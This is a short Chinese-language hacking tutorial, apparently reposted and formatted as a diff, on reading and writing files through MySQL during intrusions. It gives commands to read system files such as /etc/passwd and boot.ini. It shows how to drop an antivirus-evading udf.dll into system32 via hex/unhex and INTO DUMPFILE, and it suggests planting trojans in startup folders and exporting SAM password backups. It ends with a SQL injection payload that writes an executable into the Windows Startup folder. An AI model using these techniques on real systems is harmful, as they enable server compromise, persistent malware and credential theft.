@@ -1,0 +1,44 @@
+(转)
+
+今天朋友问我如何在mysql下读取文件，把我问愣了，发现自己还是犯了不求甚解的毛病，因此特地查了下mysql使用手册。 
+思路都一样，在拥有file权限的前提下，读取文件为字符串形式插入表中，然后读出表中数据，只是方式略有不同 
+
+mysql3.x下 
+
+不确定mysql3.x下能否使用load_file()函数（我在mysql3使用手册上没有查到，但貌似是可以的），用 load data infile 读取文件，命令如下 
+
+mysql>create table a (cmd text); 
+mysql>load data infile 'c:\\boot.ini' into table a; 
+mysql>select * from a; 
+
+mysql4.x下 
+
+mysql4.x下除了 load data infile 外还可以用大家熟知的 load_file() 来读取，命令如下 
+
+mysql>create table a (cmd text); 
+mysql>insert into a (cmd) values (load_file('c:\\boot.ini')); 
+mysql>select * from a; 
+
+mysql5.x下 
+
+在linux下，mysql5.x 除了上面两种方法，还可以利用 system 直接执行系统命令的方式来读取文件（是否必须root身份不确定，未测试），命令如下 
+
+mysql>system cat /etc/passwd 
+
+
+mysql下读取文件在入侵中用到的时候不多，可能用于查询配置文件寻找web路径，或者webshell权限很小的时候读取其他格式的webshell内容然后用into outfile方式写入大马等，二进制文件也可以这样用，只是多了hex()和unhex()的工序。 
+
+
+例：把免杀过的udf.dll文件插入系统目录 
+
+create table a (cmd LONGBLOB); 
+insert into a (cmd) values (hex(load_file('c:\\windows\\temp\\udf.dll'))); 
+SELECT unhex(cmd) FROM a INTO DUMPFILE 'c:\\windows\\system32\\udf.dll'; 
+
+其他的利用方法也很多，如把木马文件写入启动项，或者把加工过的cmd.exe文件导出到系统根目录下，把sam备份导出到可读目录等等，注入中应该也可以这样用(在不知道web路径又可以导出文件的情况下)，大家自由发挥吧。 
+
+
+注入中的语法（未测试） 
+
+
+id=xxx and 1=2 union select 1,2,3,unhex(mm.exe的十六进制),5 INTO DUMPFILE 'C:\\Documents and Settings\\All Users\\「开始」菜单\程序\启动\\mm.exe'/* 
